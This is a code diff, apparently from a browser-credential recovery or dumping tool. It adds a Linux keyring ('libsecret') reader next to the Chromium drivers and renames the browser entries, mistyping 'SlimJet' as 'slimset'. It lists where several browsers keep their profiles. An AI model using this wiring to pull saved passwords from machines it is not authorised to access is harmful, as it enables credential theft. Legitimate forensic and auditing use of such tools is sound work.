@@ -11,6 +11,9 @@ if sys.platform.startswith('win32'):
 	from modules.windows.vault import Vault
 	from modules.windows.wifi import Wifi
 
+if sys.platform.startswith('linux'):
+	from modules.linux.libsecret import Libsecret
+
 if sys.platform.startswith('win32'):
 	firefox_browsers = [
 		(u'firefox', u'{APPDATA}\\Mozilla\\Firefox'),
@@ -55,15 +58,15 @@ if sys.platform.startswith('win32'):
 
 elif sys.platform.startswith('linux'):
 	chromium_browsers = [
-		(u'Google Chrome', u'.config/google-chrome'),
-		(u'Chromium', u'.config/chromium'),
-		(u'Brave', u'.config/BraveSoftware/Brave-Browser'),
-		(u'SlimJet', u'.config/slimjet'),
-		(u'Dissenter Browser', u'.config/GabAI/Dissenter-Browser'),
-		(u'Vivaldi', u'.config/vivaldi'),
-		(u'Microsoft Edge (Dev)', u'.config/microsoft-edge-dev'),
-		(u'Microsoft Edge (Beta)', u'.config/microsoft-edge-beta'),
-		(u'Microsoft Edge', u'.config/microsoft-edge'),
+		(u'google chrome', u'.config/google-chrome'),
+		(u'chromium', u'.config/chromium'),
+		(u'brave', u'.config/BraveSoftware/Brave-Browser'),
+		(u'slimset', u'.config/slimjet'),
+		(u'dissenter Browser', u'.config/GabAI/Dissenter-Browser'),
+		(u'vivaldi', u'.config/vivaldi'),
+		(u'microsoft edge (dev)', u'.config/microsoft-edge-dev'),
+		(u'microsoft edge (beta)', u'.config/microsoft-edge-beta'),
+		(u'microsoft edge', u'.config/microsoft-edge'),
 	]
 
 
@@ -141,6 +144,8 @@ class ModuleManager:
 			if self.targets.get(key):
 				match key:
 					case 'chromium':
+						if sys.platform.startswith('linux'):
+							drivers.extend([Libsecret()])
 						drivers.extend(
 							[Chromium(browser_name=name, paths=paths) for name, paths in self.targets.get(key)])
 					case 'firefox':
